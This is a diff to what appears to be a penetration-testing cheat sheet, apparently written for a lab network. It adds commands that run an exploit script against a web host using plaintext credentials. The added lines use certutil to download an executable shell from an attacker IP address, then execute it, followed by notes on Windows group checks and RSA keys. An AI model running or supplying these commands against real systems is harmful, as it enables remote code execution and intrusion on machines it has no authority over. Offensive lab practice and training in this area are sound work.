@@ -660,6 +660,13 @@ net localgroup administrators
 Check current group:
 whoami /groups
 
+If you have a normal cmd shell on a service user, you can try run below to get a powershell: powershell.exe -a '-NoProfile -Command ls'
+example belows:
+python exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -i "http://web02.relia.com:14080" -c powershell.exe -a '-NoProfile -Command ls'
+python exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -i "http://web02.relia.com:14080" -c powershell.exe -a '-NoProfile -Command mkdir C:\\tmp'
+python exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -i "http://web02.relia.com:14080" -c powershell.exe -a '-NoProfile -Command certutil -urlcache -f http://192.168.45.197/shell1708.exe C:\\tmp\\shell1708.exe'
+python exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -i "http://web02.relia.com:14080" -c powershell.exe -a '-NoProfile -Command C:\\tmp\\shell1708.exe'
+
 g.) RSA Key - 
 
 i.) encrypted where hype_key is the key name
